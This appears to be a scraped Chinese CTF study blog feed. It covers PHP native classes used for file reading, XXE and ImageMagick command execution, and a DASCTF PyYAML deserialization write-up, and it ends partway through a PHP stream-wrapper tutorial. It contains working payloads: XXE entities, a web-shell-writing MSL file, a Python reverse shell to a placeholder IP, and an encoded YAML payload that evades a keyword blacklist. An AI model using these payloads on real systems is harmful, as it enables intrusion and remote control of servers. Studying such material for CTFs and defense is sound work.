class="code"><pre><code class="hljs php">传入路径进行扫描<br><span class="hljs-variable">$dir</span> = <span class="hljs-keyword">new</span> <span class="hljs-built_in">DirectoryIterator</span>(<span class="hljs-string">&#x27;/path/to/directory&#x27;</span>);<br>可配合glob伪协议进行精确读取<br><span class="hljs-variable">$dir</span> = <span class="hljs-keyword">new</span> <span class="hljs-built_in">DirectoryIterator</span>(<span class="hljs-string">&#x27;glob:///f*&#x27;</span>); 读取根目录下以f开头的文件<br></code></pre></td></tr></table></figure><blockquote><p>一般情况不能遍历输出那么就只能输出一个</p></blockquote><h2 id="GlobIterator"><a href="#GlobIterator" class="headerlink" title="GlobIterator"></a><strong>GlobIterator</strong></h2><p><code>GlobIterator</code> 是 PHP 的内置类，继承自 <code>FilesystemIterator</code>，专为 <strong>基于通配符模式（glob）的文件遍历</strong> 设计。它简化了按模式匹配文件的过程，无需手动过滤文件名，适用于快速枚举文件系统或查找特定文件。</p><p>用法：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php">直接输入通配符使用<br><span class="hljs-variable">$iterator</span> = <span class="hljs-keyword">new</span> <span class="hljs-built_in">GlobIterator</span>(<span class="hljs-string">&#x27;*.php&#x27;</span>);<br>或者配合路径使用 查找路径下匹配的文件<br><span class="hljs-variable">$iterator</span> = <span class="hljs-keyword">new</span> <span class="hljs-built_in">GlobIterator</span>(<span class="hljs-string">&#x27;/var/www/*.php&#x27;</span>);<br></code></pre></td></tr></table></figure><h1 id="文件读取"><a href="#文件读取" class="headerlink" title="文件读取"></a>文件读取</h1><h2 id="SplFileObject"><a href="#SplFileObject" class="headerlink" title="SplFileObject"></a><strong>SplFileObject</strong></h2><p><code>SplFileObject</code> 是 PHP 的内置类，继承自 <code>SplFileInfo</code>，专为 <strong>高效读写文件</strong> 设计。它在 CTF 中常用于 <strong>文件内容读取</strong>、<strong>源码泄露</strong> 和 <strong>特殊协议利用</strong>，尤其是在反序列化或文件操作漏洞场景中</p><p>用法：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php">直接读取文件<br><span class="hljs-variable">$file</span> = <span class="hljs-keyword">new</span> <span class="hljs-built_in">SplFileObject</span>(<span class="hljs-string">&#x27;/etc/passwd&#x27;</span>);<br>配合伪协议读取文件<br><span class="hljs-variable">$file</span> = <span class="hljs-keyword">new</span> <span class="hljs-built_in">SplFileObject</span>(<span class="hljs-string">&#x27;php://filter/convert.base64-encode/resource=h1nt.txt&#x27;</span>);<br></code></pre></td></tr></table></figure><h2 id="SimpleXMLElement"><a href="#SimpleXMLElement" class="headerlink" title="SimpleXMLElement"></a><strong><code>SimpleXMLElement</code></strong></h2><p><code>SimpleXMLElement</code> 是 PHP 的内置类，用于解析和操作 XML 数据。在 CTF 中，它常被用于 <strong>XXE（XML External Entity）攻击</strong>，通过构造恶意 XML 实体实现 <strong>文件读取</strong>、<strong>SSRF（服务端请求伪造）</strong> 或 <strong>远程代码执行</strong>。</p><p>基本用法：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$sxe</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">SimpleXMLElement</span>(<span class="hljs-string">&#x27;data.xml&#x27;</span>, <span class="hljs-number">0</span>, <span class="hljs-literal">true</span>); <span class="hljs-comment">// 从文件加载</span><br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$sxe</span>-&gt;user;<br></code></pre></td></tr></table></figure><p>可以解析XML实体文件那么可不可以自己写个XML文件实现rce或者任意文件读取呢</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//配合伪协议读取文件</span><br><span class="hljs-variable">$payload</span> = <span class="hljs-string">&lt;&lt;&lt;XML</span><br><span class="hljs-string">&lt;!DOCTYPE test [</span><br><span class="hljs-string">    &lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot;&gt;</span><br><span class="hljs-string">]&gt;</span><br><span class="hljs-string">&lt;root&gt;&amp;xxe;&lt;/root&gt;</span><br><span class="hljs-string">XML</span>;<br><br><span class="hljs-comment">// 需要关闭实体加载器限制（PHP &lt; 8.0）</span><br><span class="hljs-title function_ invoke__">libxml_disable_entity_loader</span>(<span class="hljs-literal">false</span>);<br><span class="hljs-variable">$sxe</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">SimpleXMLElement</span>(<span class="hljs-variable">$payload</span>, LIBXML_NOENT);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$sxe</span>; <span class="hljs-comment">// 输出 /etc/passwd 内容</span><br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//进行ssrf，进行外带等操作</span><br><span class="hljs-variable">$payload</span> = <span class="hljs-string">&lt;&lt;&lt;XML</span><br><span class="hljs-string">&lt;!DOCTYPE test [</span><br><span class="hljs-string">    &lt;!ENTITY xxe SYSTEM &quot;http://192.168.1.1:8080/&quot;&gt;</span><br><span class="hljs-string">]&gt;</span><br><span class="hljs-string">&lt;root&gt;&amp;xxe;&lt;/root&gt;</span><br><span class="hljs-string">XML</span>;<br><br><span class="hljs-variable">$sxe</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">SimpleXMLElement</span>(<span class="hljs-variable">$payload</span>, LIBXML_NOENT);<br></code></pre></td></tr></table></figure><h1 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h1><h2 id="Imagick"><a href="#Imagick" class="headerlink" title="Imagick"></a><strong><code>Imagick</code></strong></h2><p><code>Imagick</code> 是 PHP 的图像处理扩展，支持多种图像格式的操作。在 CTF 中，它常被用于 <strong>恶意图像利用</strong> 和 <strong>文件读取&#x2F;命令执行</strong></p><blockquote><p>CVE-2016-3714:允许通过恶意图像执行命令，利用本函数</p></blockquote><p>先上传恶意图片</p><figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs smali">push graphic-context<br>viewbox 0 0 640 480<span class="hljs-built_in"></span><br><span class="hljs-built_in">fill </span>&#x27;url(https://example.com/image.jpg<span class="hljs-string">&quot;|ls -la &gt; /tmp/result&quot;</span>)&#x27;<br>pop graphic-context<br></code></pre></td></tr></table></figure><p>在触发</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$imagick</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Imagick</span>(<span class="hljs-string">&#x27;exploit.png&#x27;</span>); <span class="hljs-comment">// 读取恶意图像</span><br><span class="hljs-variable">$imagick</span>-&gt;<span class="hljs-title function_ invoke__">writeImage</span>(<span class="hljs-string">&#x27;output.png&#x27;</span>);    <span class="hljs-comment">// 触发命令</span><br></code></pre></td></tr></table></figure><p>MSL 脚本利用</p><p>上传恶意msl文件</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">image</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">read</span> <span class="hljs-attr">filename</span>=<span class="hljs-string">&quot;caption:&lt;?php system($_GET[&#x27;cmd&#x27;]); ?&gt;&quot;</span>/&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">write</span> <span class="hljs-attr">filename</span>=<span class="hljs-string">&quot;output.php&quot;</span>/&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">image</span>&gt;</span><br></code></pre></td></tr></table></figure><p><strong>触发 MSL 脚本</strong>：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$imagick</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Imagick</span>();<br><span class="hljs-variable">$imagick</span>-&gt;<span class="hljs-title function_ invoke__">readImage</span>(<span class="hljs-string">&#x27;msl:poc.msl&#x27;</span>); <span class="hljs-comment">// 加载 MSL 脚本</span><br><span class="hljs-variable">$imagick</span>-&gt;<span class="hljs-title function_ invoke__">writeImage</span>(<span class="hljs-string">&#x27;dummy.png&#x27;</span>);  <span class="hljs-comment">// 生成 output.php</span><br></code></pre></td></tr></table></figure><p>访问 <code>output.php?cmd=id</code> 即可执行命令</p><p>通过 <code>caption:</code> 协议读取本地文件：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$imagick</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Imagick</span>(<span class="hljs-string">&#x27;caption:&lt;?php echo file_get_contents(&quot;/flag&quot;); ?&gt;&#x27;</span>);<br><span class="hljs-variable">$imagick</span>-&gt;<span class="hljs-title function_ invoke__">writeImage</span>(<span class="hljs-string">&#x27;output.php&#x27;</span>); <span class="hljs-comment">// 生成包含 Flag 的 PHP 文件</span><br></code></pre></td></tr></table></figure><h1 id="信息泄露"><a href="#信息泄露" class="headerlink" title="信息泄露"></a>信息泄露</h1><h2 id="Error和Exception"><a href="#Error和Exception" class="headerlink" title="Error和Exception"></a>Error和Exception</h2><p>对于没有回显的rce可以利用这个方法</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Exploit</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$message</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$cmd</span></span>) </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;message = <span class="hljs-variable">$cmd</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$this</span>-&gt;message); <span class="hljs-comment">// 触发命令执行但是没有回显</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&quot;</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-comment">// 构造 Error 对象，利用其 __toString 方法</span><br><span class="hljs-variable">$error</span> = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Error</span>((<span class="hljs-keyword">string</span>) <span class="hljs-keyword">new</span> <span class="hljs-title class_">Exploit</span>(<span class="hljs-string">&#x27;id&#x27;</span>));<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$error</span>; <span class="hljs-comment">// 输出命令执行结果</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>知识点</category>
      
    </categories>
    
    
    <tags>
      
      <tag>PHP原生类</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2025.1.24</title>
    <link href="/tuyi/2025/01/24/2025-1-24/"/>
    <url>/tuyi/2025/01/24/2025-1-24/</url>
    
    <content type="html"><![CDATA[<h2 id="DASCTF-2024最后一战｜寒夜破晓，冬至终章-yaml-matser"><a href="#DASCTF-2024最后一战｜寒夜破晓，冬至终章-yaml-matser" class="headerlink" title="DASCTF 2024最后一战｜寒夜破晓，冬至终章]yaml_matser"></a>DASCTF 2024最后一战｜寒夜破晓，冬至终章]yaml_matser</h2><p>源码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">import</span> yaml<br><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, request, jsonify, render_template<br><br><br>app = Flask(__name__, template_folder=<span class="hljs-string">&#x27;templates&#x27;</span>)<br><br>UPLOAD_FOLDER = <span class="hljs-string">&#x27;uploads&#x27;</span><br>os.makedirs(UPLOAD_FOLDER, exist_ok=<span class="hljs-literal">True</span>)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">waf</span>(<span class="hljs-params">input_str</span>):<br><br><br>    blacklist_terms = &#123;<span class="hljs-string">&#x27;apply&#x27;</span>, <span class="hljs-string">&#x27;subprocess&#x27;</span>,<span class="hljs-string">&#x27;os&#x27;</span>,<span class="hljs-string">&#x27;map&#x27;</span>, <span class="hljs-string">&#x27;system&#x27;</span>, <span class="hljs-string">&#x27;popen&#x27;</span>, <span class="hljs-string">&#x27;eval&#x27;</span>, <span class="hljs-string">&#x27;sleep&#x27;</span>, <span class="hljs-string">&#x27;setstate&#x27;</span>,<br>                       <span class="hljs-string">&#x27;command&#x27;</span>,<span class="hljs-string">&#x27;static&#x27;</span>,<span class="hljs-string">&#x27;templates&#x27;</span>,<span class="hljs-string">&#x27;session&#x27;</span>,<span class="hljs-string">&#x27;&amp;&#x27;</span>,<span class="hljs-string">&#x27;globals&#x27;</span>,<span class="hljs-string">&#x27;builtins&#x27;</span><br>                       <span class="hljs-string">&#x27;run&#x27;</span>, <span class="hljs-string">&#x27;ntimeit&#x27;</span>, <span class="hljs-string">&#x27;bash&#x27;</span>, <span class="hljs-string">&#x27;zsh&#x27;</span>, <span class="hljs-string">&#x27;sh&#x27;</span>, <span class="hljs-string">&#x27;curl&#x27;</span>, <span class="hljs-string">&#x27;nc&#x27;</span>, <span class="hljs-string">&#x27;env&#x27;</span>, <span class="hljs-string">&#x27;before_request&#x27;</span>, <span class="hljs-string">&#x27;after_request&#x27;</span>,<br>                       <span class="hljs-string">&#x27;error_handler&#x27;</span>, <span class="hljs-string">&#x27;add_url_rule&#x27;</span>,<span class="hljs-string">&#x27;teardown_request&#x27;</span>,<span class="hljs-string">&#x27;teardown_appcontext&#x27;</span>,<span class="hljs-string">&#x27;\\u&#x27;</span>,<span class="hljs-string">&#x27;\\x&#x27;</span>,<span class="hljs-string">&#x27;+&#x27;</span>,<span class="hljs-string">&#x27;base64&#x27;</span>,<span class="hljs-string">&#x27;join&#x27;</span>&#125;<br><br>    input_str_lower = <span class="hljs-built_in">str</span>(input_str).lower()<br><br><br>    <span class="hljs-keyword">for</span> term <span class="hljs-keyword">in</span> blacklist_terms:<br>        <span class="hljs-keyword">if</span> term <span class="hljs-keyword">in</span> input_str_lower:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Found blacklisted term: <span class="hljs-subst">&#123;term&#125;</span>&quot;</span>)<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br><br><br>file_pattern = re.<span class="hljs-built_in">compile</span>(<span class="hljs-string">r&#x27;.*\.yaml$&#x27;</span>)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">is_yaml_file</span>(<span class="hljs-params">filename</span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">bool</span>(file_pattern.<span class="hljs-keyword">match</span>(filename))<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">    Welcome to DASCTF X 0psu3</span><br><span class="hljs-string">    &lt;br&gt;</span><br><span class="hljs-string">    Here is the challenge &lt;a href=&quot;/upload&quot;&gt;Upload file&lt;/a&gt;</span><br><span class="hljs-string">    &lt;br&gt;</span><br><span class="hljs-string">    Enjoy it &lt;a href=&quot;/Yam1&quot;&gt;Yam1&lt;/a&gt;</span><br><span class="hljs-string">    &#x27;&#x27;&#x27;</span><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/upload&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">upload_file</span>():<br>    <span class="hljs-keyword">if</span> request.method == <span class="hljs-string">&#x27;POST&#x27;</span>:<br>        <span class="hljs-keyword">try</span>:<br>            uploaded_file = request.files[<span class="hljs-string">&#x27;file&#x27;</span>]<br><br>            <span class="hljs-keyword">if</span> uploaded_file <span class="hljs-keyword">and</span> is_yaml_file(uploaded_file.filename):<br>                file_path = os.path.join(UPLOAD_FOLDER, uploaded_file.filename)<br>                uploaded_file.save(file_path)<br><br>                <span class="hljs-keyword">return</span> jsonify(&#123;<span class="hljs-string">&quot;message&quot;</span>: <span class="hljs-string">&quot;uploaded successfully&quot;</span>&#125;), <span class="hljs-number">200</span><br>            <span class="hljs-keyword">else</span>:<br>                <span class="hljs-keyword">return</span> jsonify(&#123;<span class="hljs-string">&quot;error&quot;</span>: <span class="hljs-string">&quot;Just YAML file&quot;</span>&#125;), <span class="hljs-number">400</span><br><br>        <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>            <span class="hljs-keyword">return</span> jsonify(&#123;<span class="hljs-string">&quot;error&quot;</span>: <span class="hljs-built_in">str</span>(e)&#125;), <span class="hljs-number">500</span><br><br><br>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;upload.html&#x27;</span>)<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/Yam1&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">Yam1</span>():<br>    filename = request.args.get(<span class="hljs-string">&#x27;filename&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>)<br>    <span class="hljs-keyword">if</span> filename:<br>        <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">f&#x27;uploads/<span class="hljs-subst">&#123;filename&#125;</span>.yaml&#x27;</span>, <span class="hljs-string">&#x27;rb&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>            file_content = f.read()<br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> waf(file_content):<br>            test = yaml.load(file_content)<br>            <span class="hljs-built_in">print</span>(test)<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;welcome&#x27;</span><br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    app.run()<br><br><br><br></code></pre></td></tr></table></figure><p>看源码是YAML反序列化。。。不太会后面应该会写一篇博客学习一下 参考<a href="https://www.tr0y.wang/2022/06/06/SecMap-unserialize-pyyaml/">https://www.tr0y.wang/2022/06/06/SecMap-unserialize-pyyaml/</a></p><p>ban了好多常规的函数尝试绕过吧，编码绕过</p><p>可以发现是直接使用的<code>yaml.load</code>应该是&lt;5.1版本的，高版本要使用构造器</p><p>可以发现exec函数是没有过滤的</p><p>尝试使用exec构建解码器执行命令</p><p>命令：</p><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs less"><span class="hljs-selector-tag">__import__</span>(<span class="hljs-string">&#x27;os&#x27;</span>)<span class="hljs-selector-class">.system</span>(<span class="hljs-string">&#x27;python3 -c \&#x27;</span>import os,pty,socket;s=socket.<span class="hljs-built_in">socket</span>();s.<span class="hljs-built_in">connect</span>((<span class="hljs-string">&quot;ip&quot;</span>,<span class="hljs-number">32800</span>));[os.<span class="hljs-built_in">dup2</span>(s.<span class="hljs-built_in">fileno</span>(),f)for f <span class="hljs-built_in">in</span>(<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">2</span>)];pty.<span class="hljs-built_in">spawn</span>(<span class="hljs-string">&quot;sh&quot;</span>)\<span class="hljs-string">&#x27;&#x27;</span>)<br></code></pre></td></tr></table></figure><p>在url编码上传执行就可以</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-type">!!python/object/new:type</span><br><span class="hljs-attr">args:</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-string">exp</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-type">!!python/tuple</span> []<br>  <span class="hljs-bullet">-</span> &#123;<span class="hljs-attr">&quot;extend&quot;:</span> <span class="hljs-type">!!python/name:exec</span> &#125;<br><span class="hljs-attr">listitems:</span> <span class="hljs-string">&quot;import urllib; exec(urllib.parse.unquote(&#x27;%5f%5f%69%6d%70%6f%72%74%5f%5f%28%27%6f%73%27%29%2e%73%79%73%74%65%6d%28%27%70%79%74%68%6f%6e%33%20%2d%63%20%5c%27%69%6d%70%6f%72%74%20%6f%73%2c%70%74%79%2c%73%6f%63%6b%65%74%3b%73%3d%73%6f%63%6b%65%74%2e%73%6f%63%6b%65%74%28%29%3b%73%2e%63%6f%6e%6e%65%63%74%28%28%22%69%70%22%2c%33%32%38%30%30%29%29%3b%5b%6f%73%2e%64%75%70%32%28%73%2e%66%69%6c%65%6e%6f%28%29%2c%66%29%66%6f%72%20%66%20%69%6e%28%30%2c%31%2c%32%29%5d%3b%70%74%79%2e%73%70%61%77%6e%28%22%73%68%22%29%5c%27%27%29&#x27;))&quot;</span><br></code></pre></td></tr></table></figure><p>学习大佬博客： </p><p><a href="https://www.tr0y.wang/s">https://www.tr0y.wang/s</a></p><p><a href="https://lisien11.xyz/">https://lisien11.xyz/</a></p>]]></content>
    
    
    <categories>
      
      <category>每日一web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>PyYAML</tag>
      
      <tag>反序列化</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>PHP伪协议</title>
    <link href="/tuyi/2025/01/23/PHP%E4%BC%AA%E5%8D%8F%E8%AE%AE/"/>
    <url>/tuyi/2025/01/23/PHP%E4%BC%AA%E5%8D%8F%E8%AE%AE/</url>
    
    <content type="html"><![CDATA[<p>介绍php常见的伪协议</p><h1 id="php-协议族"><a href="#php-协议族" class="headerlink" title="php:&#x2F;&#x2F; 协议族"></a>php:&#x2F;&#x2F; 协议族</h1><p>这些协议用于访问 PHP 的输入&#x2F;输出流、内存、临时文件等资源</p><h2 id="php-input"><a href="#php-input" class="headerlink" title="php://input"></a><strong><code>php://input</code></strong></h2><p><strong>用途</strong>：读取原始的 HTTP 请求体数据（如 POST,GET 数据）</p><p><strong>实例</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$rawData</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&#x27;php://input&#x27;</span>);<br></code></pre></td></tr></table></figure><h2 id="php-filter"><a href="#php-filter" class="headerlink" title="php://filter"></a><strong><code>php://filter</code></strong></h2><p><strong>用途</strong>：在读写文件时应用过滤器（如编码&#x2F;加密）。</p><p><strong>语法</strong>：<code>php://filter/&lt;过滤器链&gt;/resource=&lt;文件路径&gt;</code></p><p>官方文档：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs routeros">名称 描述<br><span class="hljs-attribute">resource</span>=&lt;要过滤的数据流&gt;     这个参数是必须的。它指定了你要筛选过滤的数据流。<br><span class="hljs-attribute">read</span>=&lt;读链的筛选列表&gt;         该参数可选。可以设定一个或多个过滤器名称，以管道符（|）分隔。<br><span class="hljs-attribute">write</span>=&lt;写链的筛选列表&gt;    该参数可选。可以设定一个或多个过滤器名称，以管道符（|）分隔。<br>&lt;；两个链的筛选列表&gt;        任何没有以 read= 或 write= 作前缀 的筛选器列表会视情况应用于读或写链。<br></code></pre></td></tr></table></figure><h3 id="过滤器："><a href="#过滤器：" class="headerlink" title="过滤器："></a>过滤器：</h3><h3 id="转换过滤器："><a href="#转换过滤器：" class="headerlink" title="转换过滤器："></a>转换过滤器：</h3><h4 id="convert-base64-encode-和-convert-base64-decode"><a href="#convert-base64-encode-和-convert-base64-decode" class="headerlink" title="convert.base64-encode 和 convert.base64-decode"></a>convert.base64-encode 和 convert.base64-decode</h4><p>将读取的数据进行base64转换后输出</p><p>用法：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$data</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&#x27;php://filter/read=convert.base64-encode/resource=file.txt&#x27;</span>);<br></code></pre></td></tr></table></figure><h4 id="convert-quoted-printable-encode-和-convert-quoted-printable-decode"><a href="#convert-quoted-printable-encode-和-convert-quoted-printable-decode" class="headerlink" title="convert.quoted-printable-encode 和 convert.quoted-printable-decode"></a>convert.quoted-printable-encode 和 convert.quoted-printable-decode</h4><p>将非ascii码的值转换为转换为 <code>=XX</code> 格式的 ASCII 字符串，其中 <code>XX</code> 是该字符的十六进制值。</p><p>用法：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$text</span> = <span class="hljs-string">&quot;Hello, 世界! =&quot;</span>;<br><span class="hljs-variable">$encoded</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&#x27;php://filter/write=convert.quoted-printable-encode/resource=data://text/plain,&#x27;</span> . <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-variable">$text</span>));<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$encoded</span>;<br><span class="hljs-comment">//Hello,=20=E4=B8=96=E7=95=8C!=20=3D 中文被转换</span><br></code></pre></td></tr></table></figure><h4 id="convert-iconv"><a href="#convert-iconv" class="headerlink" title="convert.iconv.*"></a>convert.iconv.*</h4><blockquote><p>依赖 <code>iconv</code> 扩展，需确保 PHP 已启用该扩展</p></blockquote><p><code>convert.iconv.*</code> 是一个强大的流过滤器（Stream Filter），用于在不同字符编码之间进行转换</p><p><strong>过滤器格式</strong>：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs 